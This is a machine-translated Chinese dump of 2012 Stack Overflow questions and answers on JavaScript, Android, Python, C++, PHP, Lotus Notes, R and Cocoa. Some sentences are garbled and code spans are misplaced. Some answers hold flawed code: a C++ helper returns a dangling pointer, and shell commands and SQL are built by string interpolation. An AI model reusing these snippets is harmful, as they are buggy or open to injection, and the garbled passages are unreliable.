该脚本以定义开始`T$$`，它只在`init`. 该函数在容器中按标签名称查找元素。它可以很容易地修改为使用类选择器，例如：

```
function T$$(e,p){
    if(e[0] == '.') {
       var matches = p.getElementsByClassName(e.substring(1));
       return matches.length == 0 ? null : matches[0];
    } else {
       return p.getElementsByTagName(e);
    }
} 
```

上面的代码使用`getElementsByClassName`if 传递的搜索字符串的第一个字符是一个点，表示一个 css 类选择器；否则，它会按标签名称返回一个元素，就像在原始源中一样。

例如，您当然可以通过检查领先`#`和做来扩展它`getElementById`。如果您已经在您的网站上运行 jQuery，您可以简化它并利用 jQuery 的嘶嘶声选择器：

```
function T$$(e,p) { return $(p).find(e); } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:11:14.997

如果你在谈论[这个](http://www.scriptiny.com/2009/03/accordion/)脚本，你不能在不修改代码的情况下使用你想要的类名。也就是说，按照它目前的工作方式，“init”函数的第二个参数必须是标签名称。

该代码并不漂亮，但它很简单，因此以某种方式增强它以满足您的需求应该不会太难。

# android - 自动调整 SeekBars Android

> ID：10676310
> 
> 赞同：1
> 
> 时间：2012-05-20T19:03:46.573
> 
> 标签：android, math, seekbar

我有 6 个范围从 0 到 3000 的 SeekBar。我还有一个算法可以计算出如果你调整其中一个搜索栏会有什么区别，因此所有搜索栏的总数始终等于 3000。例如，如果搜索栏 #1 = 1500 和搜索栏 #2 = 1500，我将 seekbar #1 更改为 1000，差值将等于 500，并且 seekbar 应该跳到 2000 (1000 + 2000 = 3000)。我可以找到不同之处，但是如何更新其他滑块？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:07:31.183

`SeekBar`是 的后代`ProgressBar`，因此您应该可以调用`incrementProgressBy(int diff)`它。因此，如果您需要将滑块增加 500，您可以调用

```
slider.incrementProgressBy(500); 
```

当然，您需要跟踪它现在的位置，以免增加超出最大允许限制。

# colors - 核心情节：是否可以根据背景颜色设置轴文本颜色？

> ID：10676311
> 
> 赞同：1
> 
> 时间：2012-05-20T19:03:56.413
> 
> 标签：colors, core-plot

我的图表中有不同的图。

![在此处输入图像描述](../Images/8bcf3c4342a55b68ca2c6eb6d06cdb78.png)

图的颜色是不可变的，因为它们代表固定的含义。是否可以根据背景颜色设置轴标签的颜色？或者，文本阴影或边框也足够了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:22:22.503

不是自动的，但您可以创建自定义轴标签。自定义标签可以使用不同的文本样式（包括颜色）、阴影、填充和/或边框。

# java - main.xml 中的访问对象

> ID：10676324
> 
> 赞同：0
> 
> 时间：2012-05-20T19:05:42.607
> 
> 标签：java, android

我正在尝试创建一个小部件，但我无法从代码中访问 main.xml 元素。如果我有一个活动，我可以使用 findViewById，但在这种情况下它不起作用。

如何从小部件访问 main.xml 中的元素？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:23:50.420

我不确定这是否是您需要的，因为我不明白您为什么没有活动，请告诉我这是否是您想要的：

```
LayoutInflater inflater = (LayoutInflater) getContext()
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
View myView = inflater.inflate(R.layout.main, null, false); 
```

然后在视图上使用 findViewById`myView.findViewById(....)`

# python - 在 Python 中创建一个 Linux at Job（调度）

> ID：10676326
> 
> 赞同：3
> 
> 时间：2012-05-20T19:05:47.853
> 
> 标签：python, linux, cron

我正在尝试使用 python 脚本在 linux 中安排一些作业。目前，我的脚本看起来像这样：

```
import subprocess
command = 'python foo.py %s %s | at %s' % (arg1, arg2, starttime) 
subprocess.Popen([command,], shell=True) 
```

但这似乎不起作用，我希望有人能够就我应该做什么提出建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:12:54.627

如果您传入`shell=True`，则`Popen()`需要一个字符串：

```
import subprocess
command = 'python foo.py %s %s | at %s' % (arg1, arg2, starttime) 
subprocess.Popen(command, shell=True) 
```

另外，“不工作”是什么意思？这对我来说可以：

```
>>> import subprocess
>>> subprocess.Popen('echo "asd" | rev', shell=True).communicate()
dsa
(None, None) 
```

还有你的代码：

```
>>> import subprocess
>>> subprocess.Popen(['echo "asd" | rev',], shell=True).communicate()
dsa
(None, None) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:09:32.790

你的问题是`at`命令的使用，它会得到一个字符串，所以你想要的更多

```
command = 'echo python foo.py %s %s | at %s' % (arg1, arg2, starttime) 
```

或者以更蟒蛇的方式

```
sched_cmd = ['at', starttime]
command = 'python foo.py %s %s' % (arg1, arg2)
p = subprocess.Popen(sched_cmd, stdin=subprocess.PIPE)
p.communicate(command) 
```

# c++ - c++ STL cout源代码

> ID：10676336
> 
> 赞同：6
> 
> 时间：2012-05-20T19:07:08.660
> 
> 标签：c++, cout

我想看看 STL`std::cout`函数的源代码。我查看了 iostream，但我只看到了“extern cout”。所以，我猜它是在图书馆的某个地方定义的。

[我从官方网站](http://www.sgi.com/tech/stl/download.html)下载了源代码

我提取它并做了：

```
sh@sh-R528-R728:~/desktop/stl$ grep -F * | grep "cout" 
```

但我一无所获。

我究竟做错了什么？源代码在哪里？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T19:31:46.720

如果您碰巧使用的是 GCC，那么`libstdc++`就是您的 C++ 库。它的来源可以在[gcc.gnu.org](http://gcc.gnu.org/viewcvs/gcc/trunk/libstdc++-v3/)上找到。`cout`在第 58 行定义[`src/c++98/globals_io.cc`](http://gcc.gnu.org/viewcvs/gcc/trunk/libstdc++-v3/src/c++98/globals_io.cc?revision=184997&view=markup)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-20T19:13:01.453

`cout`不是 STL 的一部分，因此您不会`cout`在 STL 源代码中找到源代码。

您可能想要查找 C++ 标准库的源代码，它基于 STL，但也包含 iostream。这取决于您使用的平台。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T19:34:10.780

`std::cout`不是函数，它是`std::ostream` [（接口描述）](http://www.cplusplus.com/reference/iostream/ostream/)的一个实例，它与标准输出相关联。

如果您使用的是 gcc/libstdc++，请尽情在线浏览其[源代码](http://gcc.gnu.org/git/?p=gcc.git&a=search&h=HEAD&st=grep&s=cout;)

# javascript - 没有 xmlhttprequest 的 WebWorker？

> ID：10676344
> 
> 赞同：0
> 
> 时间：2012-05-20T19:07:46.490
> 
> 标签：javascript, ajax, web-worker

所以从我读过的内容来看，要运行一个网络工作者，你：

```
var ww = new Worker('js/myscript.js'); 
```

这将为 script.js 运行一个 xmlhttprequest，运行其中的代码并执行正常的回调工作。有什么办法可以避免使用ajax？例如

```
Function myFunction() { ... }
var ww = new Worker(myFunction); 
```

# c++ - 简单但对 C++ 来说是新的

> ID：10676345
> 
> 赞同：-3
> 
> 时间：2012-05-20T19:07:51.690
> 
> 标签：c++, vector, iterator

> **可能重复：**
> [C++ 中的向量迭代](https://stackoverflow.com/questions/409348/iteration-over-vector-in-c)

我只是想弄清楚如何遍历两个向量并比较数据。编写一个程序，该程序将获取正确的测验答案并与学生的答案进行比较以确定它们是否正确。我对使用迭代器以及如何在这种情况下应用它们感到困惑。任何人都可以帮忙吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:15:10.127

```
std::vector<int> students=get_selections(); //or whatever
std::vector<int> correct=get_cor...

bool is_equal=std::equal(students.begin(), students.end(), correct.begin()); 
```

# php - Drupal 7 - 通过代码创建多个自定义菜单项的最合适方式

> ID：10676349
> 
> 赞同：0
> 
> 时间：2012-05-20T19:08:04.170
> 
> 标签：php, menu, drupal-7, menuitem

我目前有一个使用以下代码创建的自定义菜单项，效果很好：

```
function myModule_menu(){
    $items = array();

    $items['myModule'] = array(
        'title' => 'Business Owner Dashboard',
        'page callback' => '_custom_page',
        'access arguments' => array('use_business_dashboard'),
        'type' => MENU_NORMAL_ITEM,
    );

    return $items;
} 
```

问题是我想为多个角色创建多个菜单项，而不仅仅是一个。我假设我可以以某种方式使用开关盒，但我不确定如何也找不到关于该主题的任何文档。

澄清一下，我想使用相同的 myModule_menu() 函数来设置“企业主仪表板”以及另一个名为“Referrals”的菜单项，其中包含不同的“页面回调”、“访问参数”等。任何帮助这个话题将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T08:52:40.607

添加更多菜单项非常简单 - 只需在`$items`数组中定义另一个元素：

```
function myModule_menu() {
    $items['admin/business'] = array(
        'title' => 'Business',
        'description' => 'Business.',
        'page callback' => '_administer_business',
        'access arguments' => array('administer business'),
        'file' => 'business.admin.inc', //if the page callback function is in another file
    );
    if (referrals_allowed) {
        $items['admin/referrals'] = array(
            'title' => 'Referals',
            'description' => 'Referrals.',
            'page callback' => '_administer_referrals',
            'access arguments' => array('administer referrals'),
            'file' => 'referrals.admin.inc', //if the page callback function is in another file
        );
    }

    return $items;
} 
```

# visual-studio-2010 - 在 Visual Studio 中自动将一行行语句格式化为多行

> ID：10676350
> 
> 赞同：0
> 
> 时间：2012-05-20T19:08:27.300
> 
> 标签：visual-studio-2010, resharper-6.0

这是一个单行 IF 语句的简单示例。

```
if(condition)
    something = "blah"; 
```

我发现自己经常将它们用于简单的事情，但后来在扩展应用程序时，将它们扩展为多行 if 语句

```
if(condition)
{
    something = "blah;
    somethingElse = "blar";
} 
```

但我觉得这很令人沮丧，因为我必须经过几个步骤才能做到这一点。当我输入第一个大括号时，我的代码格式化程序（Visual Studio？Resharper？）继续输入第二个（关闭）大括号，并将其格式化如下：

```
if(condition) { }
something = "blah"; 
```

然后我必须选择并删除右大括号，并进行自己的格式化以使其看起来正确。

有没有一种方法可以方便地让 resharper 或 Visual Studio 自动在单行 IF 语句周围输入大括号？例如：我在条件之后输入了一个左大括号，它会自动将其格式化为

```
if(condition)
{
    something = "blah";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:43:08.380

你可以做的是定义一个新的片段，它与没有“if ($expression)”部分的 if 代码片段完全相同：

```
<?xml version="1.0" encoding="utf-8" ?>
<CodeSnippets  xmlns="http://schemas.microsoft.com/VisualStudio/2005/CodeSnippet">
    <CodeSnippet Format="1.0.0">
        <Header>
            <Title>multiif</Title>
            <Shortcut>multiif</Shortcut>
            <Description>Code snippet for multiline if statement</Description>
            <Author>Microsoft Corporation</Author>
            <SnippetTypes>
                <SnippetType>Expansion</SnippetType>
                <SnippetType>SurroundsWith</SnippetType>
            </SnippetTypes>
        </Header>
        <Snippet>
            <Declarations>
                <Literal>
                    <ID>expression</ID>
                    <ToolTip>Expression to evaluate</ToolTip>
                    <Default>true</Default>
                </Literal>
            </Declarations>
            <Code Language="csharp"><![CDATA[
    {
        $selected$ $end$
    }]]>
            </Code>
        </Snippet>
    </CodeSnippet>
</CodeSnippets> 
```

然后，您可以通过以下方式将此代码段导入 Visual Studio：

1.  从工具菜单中选择代码片段管理器...。
2.  单击导入... 按钮。
3.  导航到您的新片段文件。

或：将新的代码片段文件复制到 C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC#\Snippets\1033\Visual C#

然后，您可以在 c# 文件中选择单行 if 语句的主体，右键单击并选择 Surround With...，然后选择您的新代码段。

# c++ - 窗口标题 GLFW 中的 FPS 计数器

> ID：10676364
> 
> 赞同：1
> 
> 时间：2012-05-20T19:10:14.857
> 
> 标签：c++, opengl, glfw

我试图让我的每秒帧数读数出现在我的窗口标题中。我以前做过一次，但我将如何设置代码来做到这一点？我需要从 float 切换到 const char *。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T21:58:08.997

一种简单的方法，使其与每个数字兼容可能是：

```
#include <sstream>

template<class T>
char* toChar(T t) {
    std::ostringstream oss;
    oss << t;
    return oss.str().c_str();
} 
```

这样，无论您使用 int、float、long 还是其他任何东西，它都可以工作并将其作为 char* 字符串返回。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:12:58.693

您可以使用[`istringstream`](http://www.cplusplus.com/reference/iostream/istringstream/)then 。`str()``c_str()`

# wcf - 为什么 WCF 端点地址每次都会改变？

> ID：10676367
> 
> 赞同：0
> 
> 时间：2012-05-20T19:10:41.807
> 
> 标签：wcf, endpoint

我是 WCF 的新手

为什么每次我运行此服务时，它都在不同的地址上运行，而不是在我写的地址上运行？

如果这很容易，我很抱歉:(

```
<configuration>
  <system.serviceModel>
  <services>
    <service behaviorConfiguration="PBServiceBehavior" name="PhoneBookService.PbService">
      <endpoint name="PbHttpEndpoint" 
          address="http://localhost:9001/PhonebookService" 
          binding="basicHttpBinding"
          contract="PhoneBookService.IPbService" />
    </service>
  </services>
  <behaviors>
    <serviceBehaviors>
      <behavior name="PBServiceBehavior">
          <serviceDebug includeExceptionDetailInFaults="true" />
          <serviceMetadata httpGetEnabled="true"  />
      </behavior>
    </serviceBehaviors>
  </behaviors>
     <serviceHostingEnvironment multipleSiteBindingsEnabled="false" />
  </system.serviceModel>
 <system.webServer>
     <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>
</configuration> 
```

![在此处输入图像描述](../Images/47e90882fa4a9630d0c048559e8f4525.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:17:59.930

如果您的 WCF 服务由 IIS 或 Visual Studio 中的内置 Web 服务器 (Cassini) 托管，则**不会**使用您的配置。

相反，您在 IIS 中定义的*虚拟目录*`*.svc`（文件所在的位置）或 Visual Studio 中内置 Cassini Web 服务器使用的动态定义（并且可能会更改）地址将确定您的端点地址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:19:09.430

也许您必须检查此设置 ![在此处输入图像描述](../Images/3a85ced7bb40954702886b4d6fb79eb1.png)

# lotus-notes - Lotusscript：以网络用户身份发送电子邮件时的发件人地址

> ID：10676368
> 
> 赞同：5
> 
> 时间：2012-05-20T19:10:41.997
> 
> 标签：lotus-notes, lotus-domino, lotusscript

我有一个作为 Web 用户运行的 lotus-script 代理，因为我需要知道当前用户是谁并相应地处理信息。问题是，在此代理中发送电子邮件时，发件人电子邮件地址显示的是网络用户电子邮件地址，而不是我定义的电子邮件地址。在发送电子邮件（作为 mime）之前，我正在设置以下字段：

```
 mailDoc.Form = "Memo"
    mailDoc.Subject = strSubject
    mailDoc.InetSendTo = strFrom
    mailDoc.PostedDate = Now
    mailDoc.Principal = strFrom
    mailDoc.FROM = strFrom
    mailDoc.INETFROM = strFrom
    mailDoc.~INetPrincipal = strFrom
    mailDoc.ReplyTo = strFrom
    mailDoc.SendFrom = strFrom
    mailDoc.SentBy = strFrom
    mailDoc.altFrom = strFrom
    mailDoc.tmpDisplaySentBy = strFrom
    mailDoc.DisplaySent = strFrom
    mailDoc.ToShow = strFrom

    mailDoc.SendTo = strSendTo 
```

但发件人地址仍显示为 Web 用户的地址。我在这里想念什么？任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T20:39:28.660

实际上通过论坛搜索，我找到了解决这个古老问题的方法（http://www-10.lotus.com/ldd/nd6forum.nsf/0/13706561dc7d693f852570af0062fcec?OpenDocument）：

```
Principle = "customerservice@xyz.com"
maildoc.Form = "Memo"
' Principal overrides From
' Must be formatted as below and must include the domain @xyz.com
' Format should equal: "From User" <fromuser@xyz.com@DOMAIN>
maildoc.Principal = |"Customer Service" <| + Principle + |@xyz.com>|
maildoc.From = Principle
maildoc.AltFrom = Principle
maildoc.SendFrom = Principle
maildoc.INetFrom = Principle
maildoc.tmpDisplaySentBy = Principle
maildoc.tmpDisplayFrom_Preview = Principle
maildoc.DisplaySent = Principle 
```

希望这对其他人有所帮助-这对我来说已经很长时间了！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-20T20:01:13.117

Lotus Notes 中的安全性不允许您通过 LotusScript 覆盖实际的发件人信息。控制它的唯一方法是将代理的**代表**属性设置为发送电子邮件的用户。但是，您必须使用设计器进行设置，并且不能在运行时更改它。

很难从您的问题中看出，但如果您尝试过并发现网络用户设置覆盖了“代表”设置，您可以尝试将电子邮件的创建拆分为第二个代理，然后再使用它第二个代理不以 Web 用户身份运行。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-21T08:52:10.453

字段 Principal 是正确的解决方案，但真正的发件人姓名可能会在水下可见。实际上，有不同的解决方案：直接在 mail.box 数据库中创建邮件。这就是 TeamMail 模板在 OpenNTF 上的作用。见[http://www.openntf.org/Projects/pmt.nsf/ProjectLookup/Team%20Mail%20Tamer](http://www.openntf.org/Projects/pmt.nsf/ProjectLookup/Team%20Mail%20Tamer)

当然，这不是正确的方法，但是如果您想混淆发送者，则没有其他解决方案。

好吧，从技术上讲，这并不完全正确：您可以创建一个扩展管理器 DLL 来更改发件人……脏，你说？当然。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-05-31T15:14:53.590

您的代码的问题是您没有正确设置 Principal 字段。它应该包括 @NotesDomain，其中 NotesDomain 是您的 Domino 邮件域。

我在 QuerySend 中这样做

```
 .INetFrom = |"| + strDispName + |" <| + strEmail + ">"
    .Principal =  |"| + strDispName + |" <| + strEmail + "@" + profile.NotesDomain(0) + ">"
    .From = strEmail
    .tmpDisplaySentBy = strEmail 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-30T18:46:31.493

正如其他人已经说过的，除非您在 mail.box 中创建邮件，否则原始发件人将始终可见。这是 Notes/Domino 安全性的一部分。

我去年在我的博客上发布了一些代码，您可以在其中看到如何做到这一点： http: [//blog.texasswede.com/lotusscript-mail-notification-class/](http://blog.texasswede.com/lotusscript-mail-notification-class/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-05-24T07:26:39.787

谢谢，您节省了我第二天的解决方案搜索！！)

在我的情况下（从标准邮箱如 info@server.xxx 向 Domino 服务器外部的用户发送通知电子邮件）我只需将以下字符串添加到备忘录文档：“INetFrom”，并将地址放在那里。

因此，即使查看邮件来源（在 gmail 帐户上），我也只能看到“INetFrom”字段中提到的人！

所以，最终代码看起来像（XPages SSJS）：

```
try {
    var memo:NotesDocument = database.createDocument();
    memo.appendItemValue("Form", "Memo");
    memo.appendItemValue("Subject", "Subject text");
    memo.appendItemValue("Body", "Body text");
    memo.appendItemValue("SendTo", "userName");
    memo.appendItemValue("INetFrom", "info@server.com");
    memo.send(); 
}catch (e){
    print ("Send Error: " + e);
} 
```

# php - ob_start /ob_get_clean 通过电子邮件发送 html php 内容/结果

> ID：10676369
> 
> 赞同：0
> 
> 时间：2012-05-20T19:11:05.723
> 
> 标签：php, html, email, ob-start

我敢肯定还有其他我不知道的更好的方法——只是尝试采用最简单的方法。将根据需要发布其他代码：

从上一页选择 php 结果：

```
 <div id="stage1sat" class="stageBox">
    <h3>STAGE 1</h3>
    <table>
    <?php

    ob_start();
    if ( ! empty($_POST['id']))
    { foreach($_POST['id'] as $key => $id) { $_POST['id'][$key] = mysql_real_escape_string($_POST['id'][$key]); } 
    $in = implode(', ', $_POST['id']); 
    $sqlSAT1 = "SELECT * FROM bandSched WHERE day='saturday' AND stage='stage 1' AND id IN ($in) ORDER BY FIELD(id, $in)"; 

    $result = mysql_query($sqlSAT1) or die('MySQL Error ' . mysql_errno() . ': ' . mysql_error()); 
    }
    if ( ! isset($result))
    {
    echo 'You did not select anything';
    }
    else
    {

    while ($row=mysql_fetch_assoc($result))
    {   

    echo "<tr>";
    echo "<td>". $row['timeShow'] ."</td><td>" . $row['bandName'] . "</td>";
    echo "</tr>";
    }

    }

    ?>
    </table> 
    </div> 
```

电子邮件处理.php

```
 <?php

    $to = $_POST["email"];
    $subject = "FPSF SCHEDULE";
    $message = ob_get_clean();
    $headers = "From: The Server <server@doe.com>" . "\r\n" .
               "Content-type: text/html" . "\r\n";

    mail($to, $subject, $message, $headers);

  ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:45:56.537

`ob_start()`您可以使用和包装这些 php 文件的结果`$message = ob_get_clean()`。

或者更改那些 php 以将结果写入变量（而不是`echo`ing 它们）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T02:09:30.430

不确定您的问题..即使在阅读评论时也是如此。如果您有权访问 php ini 文件或能够打开设置打开输出缓冲。

# php - PHP将文件中制作的图像转换为base64

> ID：10676374
> 
> 赞同：1
> 
> 时间：2012-05-20T19:11:45.840
> 
> 标签：php, base64

我有一个通过组合基于数据库数据的图像创建的图像，并且想知道如何将其转换为 base 64。我尝试了这个，但返回的字符无法解码为图像：

```
$encode ="data:image/png"; 
imagepng($image);
echo (base64_encode($encode)); 
```

我在其他人中看到了[这一点](https://stackoverflow.com/questions/3967515/convert-image-to-base64-encoding-in-php)，但这需要一条我没有的路径。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T19:18:33.947

以下将允许您在无需创建临时文件的情况下获取图像数据（在太多用户在线之前，我曾对临时文件做恶梦......）

```
ob_start(function($c) {return "data:image/png;base64,".base64_encode($c);});
imagepng($image);
ob_end_flush(); 
```

这将输出类似于：

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQAgMAAABinRfyAAAAAXNSR0IArs4c6QAAAAxQTFRFAGVygICA/8wz/+aZTn6FEAAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH2wkZEwoSgxq4wwAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAS0lEQVQI1w3EMQ3AMAwEwMdTEmWRSF68h0RQBIKl5vkUirdGX99wuKUPKkjJkfM4jueE+ivo7VW6wDCCq1VtEdtiIMY2BGlgwUU+P38ZK+RwskeQAAAAAElFTkSuQmCC 
```

适合在`<img src="..." />`.

### 编辑 PHP < 5.3 没有匿名函数：

```
// Define the function first
function ob_base64_encode($c) {
  return "data:image/png;base64,".base64_encode($c);
}
// And pass its name as a string
ob_start('ob_base64_encode');
imagepng($image);
ob_end_flush(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:16:08.403

您正在对字符串“data:image/png”进行编码 - 自然无法将其解码为图像。假设`$image`包含有效的图像数据，你应该能够简单地做

```
imagepng($image, $temp_file_name);
base64_encode(file_get_contents($temp_file_name)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-02T17:45:34.097

**来自手册： http:** [//php.net/manual/en/function.base64-encode.php#105200](http://php.net/manual/en/function.base64-encode.php#105200)

```
/**
 * Returns base64 encoded string prepended by "data:image/"
 *
 * @param $filename string
 * @param $filetype string 
 * @return string
 */
 function base64_encode_image($filename=string, $filetype=string)
 {
     if ($filename) {
         $imgbinary = fread(fopen($filename, "r"), filesize($filename));
             return 'data:image/' . $filetype 
                    . ';base64,' . base64_encode($imgbinary);
    }
} 
```

卢克在 lukeoliff.com 上的功能代码。

[我](https://stackoverflow.com/users/4001329/eric-ruiz)的功能评论。

# java - 在巨大的字符序列中查找一组字符的索引

> ID：10676376
> 
> 赞同：4
> 
> 时间：2012-05-20T19:12:21.953
> 
> 标签：java, hashmap, sequence

假设我有一个非常大的 AD 字符序列，确切地说是 40 亿。我的目标是在该大字符序列中找到长度设置为 30 的几个新字母序列的索引。当您正在寻找的序列有一个小错误（一个字母是错误的）时，这个问题的难度也会增加。我应该如何解决这个问题？

最简单的方法是在整个 40 亿个文本文件中一次迭代一个字母，但是随着内存耗尽，这将永远需要。

有人告诉我要使用哈希图，但我不确定到底要使用什么作为我的键值对。使用正则表达式的想法也出现了，但我不完全确定它是否能解决我的问题。在方向方面的任何帮助将不胜感激。谢谢！

这是我要问的说明：![](../Images/48f7079b98a03b37951e618e776ca782.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:20:24.617

这是一个经典的问题，称为[最长公共子序列](http://en.wikipedia.org/wiki/Longest_common_subsequence_problem)（LCS）。有很多算法可以解决它。基因组计划经常进行这种搜索。提供的 wiki 链接有很多示例。您的错误阈值将是一种特殊情况。

你在做基因测序吗？我问只是因为你只提到了 4 个变量:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-20T19:42:47.287

通过对字符进行编码，您每使用 2 位就浪费了 14 位。你可以在一个字节中编码四个核苷酸字母，那么你只需要半千兆字节。至于算法，您可以研究[Boyer-Moore algorithm](http://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm)`java.lang.String.indexOf`中的代码和维基百科页面。

顺便说一句，如果您为此使用 Lucene 索引，您可以立即进行搜索。这个想法是在 Lucene 中将每个 30 个字母的子序列索引为一个单独的文档。至于容错，您需要使用 N-gram，或进行模糊搜索（在 Lucene 4 中，有一种新算法可以快速定位编辑距离高达 2 或 3 的字符串）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T03:12:27.747

这是处理表示的快速简便的代码。

```
public static enum Nucleotide { 
    A,B,C,D;
}

public static int setbit(int val, int pos, boolean on) {
    if (on) {
                    // set bit
        return val | (1 << (8-pos-1));
    }
    else {
                    // unset bit
        return val & ~(1 << (8-pos-1));         
    }
}

public static int set2bits(int val, int pos, int bits) {
            // set/unset the first bit 
    val = setbit(val, pos, (bits & 2) > 0);
            // set/unset the second bit
    val = setbit(val, pos+1, (bits & 1) > 0);

    return val;
}

public static int setNucleotide(int sequence, int pos, Nucleotide tide) {
            // set both bits based on the ordinal position in the enum
    return set2bits(sequence, pos*2, tide.ordinal());
}

public static void setNucleotide(int [] sequence, int pos, Nucleotide tide) {
            // figure out which element in the array to work with
    int intpos = pos/4;
            // figure out which of the 4 bit pairs to work with.
    int bitpos = pos%4;
    sequence[intpos] = setNucleotide(sequence[intpos], bitpos, tide);       
}

public static Nucleotide getNucleotide(int [] sequence, int pos) {
    int intpos = pos/4;
    int bitpos = pos%4;
    int val = sequence[intpos];
            // get the bits for the requested on, and shift them
            // down into the least significant bits so we can
            // convert batch to the enum.
    int shift = (8-(bitpos+1)*2);       
    int tide = (val & (3 << shift)) >> shift;
    return Nucleotide.values()[tide];

}

public static void main(String args[]) {
    int sequence[] = new int[4];
    setNucleotide(sequence, 4, Nucleotide.C);
    System.out.println(getNucleotide(sequence, 4));
} 
```

显然，发生了很多位移，但少量的评论应该对正在发生的事情有意义。

当然，这种表示的缺点是您以 4 个为一组工作。如果要说 10 个核苷酸，则必须在计数中保留另一个变量，以便您知道序列中的最后 2 个核苷酸不是有用。

如果没有别的，可以用蛮力完成模糊匹配。您将输入一个 N 核苷酸序列，然后从 0 开始，检查核苷酸 0:N-1 并查看有多少匹配。然后你从 1:N 然后 2:N+1 等...

# regex - R中的简单正则表达式替换

> ID：10676377
> 
> 赞同：2
> 
> 时间：2012-05-20T19:12:40.553
> 
> 标签：regex, r

我很接近，但似乎无法让它发挥作用。我想通过找到两个数字前面有一个 0 的位置，然后将这个字符串“ **1960-12-031** **22** : 00 : **010** ”转换为这个字符串“1960-12-31 22:00:10 **”**剥离 0。

 ****我有正则表达式工作：

```
txt <- "1960-12-031 22:00:010"
gsub("(0+[0-9]{2})", "\\1", txt, perl=TRUE) 
```

我似乎无法弄清楚如何处理“\\1”来删除第一个字符。

任何援助将不胜感激 -

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:15:09.253

```
txt <- "1960-12-031 22:00:010"
gsub("0+([0-9]{2})", "\\1", txt, perl=TRUE) 
```

请注意，这会将 031、0031、00031 等替换为 31。如果您只想删除第一个零，请使用`"0{1}([0-9]{2})"`.

更新：根据评论中的建议，您可以使用`"[\\D]0+([0-9]{2})"`避免在 2012 等数字中匹配零。****

# ruby-on-rails - to_json 异常 '未定义的方法 `[]=' for # '

> ID：10676380
> 
> 赞同：0
> 
> 时间：2012-05-20T19:12:59.637
> 
> 标签：ruby-on-rails, json

我正在使用 Rails 2.2.2，当我需要“json”时，我的所有 [object].to_json 代码都会返回一个异常：

#< JSON::Ext::Generator::State:0x108823cd8> 的未定义方法 `[]='

当我使用'json/pure'时，我得到

未定义的方法“仅”用于#< JSON::Pure::Generator::State:0x1072e11e0>

任何想法如何解决这一问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T04:45:45.783

尝试使用另一个 JSON gem yajl-ruby。这解决了我的问题。

# objective-c - NSTableView 内容未正确刷新

> ID：10676381
> 
> 赞同：1
> 
> 时间：2012-05-20T19:12:59.747
> 
> 标签：objective-c, cocoa, nsmutablearray, nstableview, nsarraycontroller

我设置了一个`NSTableView`，其列绑定到一个从( ) 个实例`NSArrayController`中获取其内容的。`NSMutableArray``Matches``NSMutableDictionary`

尽管一切**正常**，但我遇到了这个问题：

当`Matches`数组更新时（这可能经常发生），表视图可能无法更新，但是当视图被重绘时（例如，当我最小化并重新加载我的应用程序时）内容看起来很好。

有什么想法吗？我怎样才能*让它*重绘视图/更新内容？

* * *

**提示：**

*   我也在`[tableView reloadData]`更新我的`Matches`数组后使用过，但没有效果。
*   这不会一直发生，但有时会发生......（在内容显示之前，需要一些耐心并在这里和那里单击或最小化应用程序）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:37:14.867

听起来您正在直接操作数组。如果是这样，可以这么说，您是在“在控制器背后”进行操作。它不会收到有关数组已更改的任何通知。

理想情况下，数组控制器应该是负责在其模型中添加和删除事物的对象；您应该在*控制器*`addObject:`上使用and `removeObject:`（或类似的），而不是数组本身。

 *否则，您可以在操作数组时发出 KVO 通知（`willChangeValueForKey:`和）；`didChangeValueForKey:`这将使控制器接受更改。*

# objective-c - Core Image CIPerspectiveTransform 过滤器：如何使用 CIVectors？

> ID：10676383
> 
> 赞同：1
> 
> 时间：2012-05-20T19:13:05.217
> 
> 标签：objective-c, ios, image-processing, core-image

